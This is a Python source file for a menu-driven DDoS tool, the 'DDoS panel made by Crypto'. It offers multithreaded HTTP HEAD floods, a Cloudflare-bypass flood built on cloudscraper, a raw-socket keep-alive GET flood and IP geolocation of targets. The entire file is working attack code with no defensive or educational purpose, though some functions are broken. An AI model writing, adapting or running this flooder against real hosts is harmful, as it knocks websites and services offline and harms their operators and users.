from ast import UAdd
import requests
import threading
import time
import datetime
from random import *
import random
import string
import os, socket, socks, ssl
from colorama import Fore, Back, Style
import colorama
import keyboard
import cloudscraper
from urllib.parse import urlparse

def Start_Screen():
    
    print(Fore.GREEN + "[+] Loading Menu...")

def launch_ip_ddos():
    ip = input("Enter the target IP address: ")
    recommended_duration = 60
    recommended_threads = 10
    print(f"Recommended duration: {recommended_duration} seconds")
    print(f"Recommended number of threads: {recommended_threads}")
    num_threads = int(input("Enter the number of threads: "))
    duration = int(input("Enter the duration of the attack (in seconds): "))

    # Start the DDoS attack
    print("Starting the DDoS attack...")
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack_ip, args=(ip,))
        t.start()
        threads.append(t)

    # Wait for the specified duration
    time.sleep(duration)

    # Stop the DDoS attack
    print("Stopping the DDoS attack...")
    for t in threads:
        t.join()

    print("DDoS attack completed.")
    
    # Ask the user if they want to continue or go back to the attack menu
    choice = input("Do you want to continue attacking? (Y/N): ")
    if choice.lower() == "y":
        launch_ip_ddos()
    else:
        attack_menu()

import socket
def send_ddos_request(target_ip):
    url = "http://" + target_ip
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
        "X-Forwarded-For": requests.get("https://api.ipify.org").text
    }
    try:
        requests.get(url, headers=headers)
        print("Request sent to", target_ip, " from your own IP address")
    except requests.exceptions.RequestException as e:
        #print("Error:", e)
        pass

def ddos_attack(target_ip, num_requests):
    threads = []
    
    for _ in range(num_requests):
        t = threading.Thread(target=send_ddos_request, args=(target_ip,))
        threads.append(t)
        t.start()
    
    for thread in threads:
        thread.join()

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            os.system("cls")
            print("") 
        else:
            os.system("cls")
            print("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

def attack_ip(ip):
    while True:
        socket.connect((target_ip, 80))
def l7():
    print(Fore.RED + "╔═══════════════════════════════════════════╗")
    print(Fore.RED + "║" + Fore.WHITE + " head " + Fore.RED + " | " + Fore.WHITE + "Sends head attack to a website.   "+Fore.RED+"║")
    print(Fore.RED + "║" + Fore.WHITE + " cfb  " + Fore.RED + " | " + Fore.WHITE + "Bypasses cloudflare               "+Fore.RED+"║")
    print(Fore.RED + "║" + Fore.WHITE + " soc  " + Fore.RED + " | " + Fore.WHITE + "Sends a socket request attack.    "+Fore.RED+"║")
    print(Fore.RED + "║" + Fore.WHITE + " pulse" + Fore.RED + " | " + Fore.WHITE + "Sends pulse waves to the target.  "+Fore.RED+"║")
    print(Fore.RED + "╚═══════════════════════════════════════════╝")
    attack_menu()
def l4():
    print()
def layerhelp():
    print(Fore.RED + "╔══════════════════════════════════════╗")
    print("║ " + Fore.BLUE + "[+]" + Fore.WHITE + " l7     " + Fore.RED + "|" + Fore.LIGHTRED_EX + "  Shows layer 7 commands.║")
    print("║ " + Fore.BLUE + "[+]" + Fore.WHITE + " l4     " + Fore.RED + "|" + Fore.LIGHTRED_EX + "  Shows layer 4 commands.║")
    print("║--------------------------------------║")
    print("║ " + Fore.BLUE + "[+]" + Fore.WHITE + " ping   " + Fore.RED + "|" + Fore.LIGHTRED_EX + "  Pings a target.        ║")
    print("║ " + Fore.BLUE + "[+]" + Fore.WHITE + " paping " + Fore.RED + "|" + Fore.LIGHTRED_EX + "  Pings a target forever.║")
    print(Fore.RED + "╚══════════════════════════════════════╝")
    attack_menu()
def attack_menu():
    num_threads = 10000
    print(Fore.RED + "╔═══════════════════════════════════════════╗")
    print(Fore.RED+"║"+Fore.WHITE+"Welcome to this DDoS panel made by Crypto  "+Fore.RED+"║")
    print(Fore.RED+"║"+Fore.WHITE+"          Please type help for help        "+Fore.RED+"║")
    print(Fore.RED + "╚═╦═════════════════════════════════════════╝")
    print(Fore.RED + "  ║")
    print(Fore.RED + "╔═╝ ")
    choice = input(Fore.RED + "╚═══" + Fore.GREEN + "> " + Fore.WHITE)
    os.system("cls")
    global target_ip
    if choice.lower() == "l7":
        #launch_webpage_ddos()
        l7()
    if choice.lower() == "l4":
        #launch_webpage_ddos()
        l4()
    elif choice.lower() == "pulse":
        launch_pulse_ddos()
    elif choice == "cfb" or choice == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif choice.lower() == "exit" or choice.lower() == "close":
        print("GoodBye :)")
        time.sleep(3)
        exit()
    elif choice == "head" or choice == "HEAD":
        launch_webpage_ddos()
    elif choice == "soc" or choice == "SOC":
        target, thread, t = get_info_l7()
        LaunchSOC(target, thread, t)
    elif choice.lower() == "ddos":
        target_ip = input(Fore.GREEN + "[A Reapers Syth]" + Fore.WHITE + " Please enter the ip: ")
        time.sleep(3)
        print(Fore.GREEN + "[L7]" + Fore.RED + " Starting Attack")
        time.sleep(3)
        os.system("cls")
        os.system("cls")
        print(Fore.RED + "[PLEASE CLICK C TO STOP THE DDOS]")
        ddos_attack(target_ip, 100000)
    elif choice.lower() == "ping":
        pingip = input(Fore.BLUE + "[+]" + Fore.WHITE + "IP to ping: ")
        os.system("ping " + pingip)
        os.system("cls")
        attack_menu()
    elif choice.lower() == "paping":
        pingip = input(Fore.BLUE + "[+]" + Fore.WHITE + "IP to ping: ")
        os.system("ping " + pingip + " -t")
        os.system("cls")
        attack_menu()
    elif choice == "search":
        geolocate_ip()
    elif choice == 4:
        print("Goodbye!")
        return
    elif choice.lower() == "help":
        os.system("cls")
        layerhelp()
    elif choice.lower() == "complain":
        print("stfu and be happy with what you got :)")
        attack_menu()
    
    else:
        print("Invalid choice. Please try again.")
        attack_menu()

def launch_pulse_ddos():
    print(Fore.RED + "Cannot take down a website with this option. This option is simply for testing.")
    url = input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the target URL: ")
    print("Recommended Amount Of Threads: 1000")
    th = int(input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the number of threads: "))
    t = int(input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the duration of the attack (in seconds): "))
    to = input(Fore.BLUE + "[+]" + Fore.WHITE + "Would you like to delay the DDoS? (YES or NO):")
    tot = 0
    os.system("cls")
    if to.lower() == "yes":
        tots = int(input("How long would you like to delay it for (in seconds): "))
        tot = tots
    else:
        print("")
    time.sleep(tot)
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    
    for _ in range(th):
        try:
            thd = threading.Thread(target=attack_head, args=(url, until))
            thd.start()
            time.sleep(10)
        except:
            pass
def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def launch_webpage_ddos():
    url = input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the target URL: ")
    print("Recommended Amount Of Threads: 1000")
    th = int(input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the number of threads: "))
    t = int(input(Fore.BLUE + "[+]" + Fore.WHITE + "Enter the duration of the attack (in seconds): "))
    to = input(Fore.BLUE + "[+]" + Fore.WHITE + "Would you like to delay the DDoS? (YES or NO):")
    tot = 0
    os.system("cls")
    if to.lower() == "yes":
        tots = int(input("How long would you like to delay it for (in seconds): "))
        tot = tots
    else:
        print("")
    time.sleep(tot)
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    
    for _ in range(th):
        try:
            thd = threading.Thread(target=attack_head, args=(url, until))
            thd.start()
        except:
            pass
response = 0
def get_info_l7():
    print("URL: ")
    target = input()
    print("Threads: ")
    thread = input()
    print("Time: ")
    t = input()
    return target, thread, t

def attack_head(url, until):
    global response
    while datetime.datetime.now() < until:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
        try:
            response = requests.head(url, headers=headers)
            print(Fore.BLUE + "[+] " + Fore.WHITE + "Current Error Code: " + Fore.GREEN + response)
        except:
            pass
def attack_pulse(url, until):
    global response
    while True:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
        try:
            response = requests.head(url, headers=headers)
            os.system("title " + response)
            break
        except:
            pass

def geolocate_ip():
    ip = input("Enter the IP address to geolocate: ")
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)
    data = response.json()
    time.sleep(2)
    print("Geolocation Results:")
    print(f"IP Address: {data['ip']}")
    print(f"Country: {data['country']}")
    print(f"Region: {data['region']}")
    print(f"City: {data['city']}")
    print(f"Postal Code: {data['postal']}")
    print(f"Latitude: {data['loc'].split(',')[0]}")
    print(f"Longitude: {data['loc'].split(',')[1]}")
    time.sleep(4)
    print("")
    input("Press Enter To Continue.")
    os.system("cls")
    attack_menu()


def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

# Start the attack menu
ua = open('./resources/ua.txt', 'r').read().split('\n')
Start_Screen()
time.sleep(5)
os.system("cls")
attack_menu()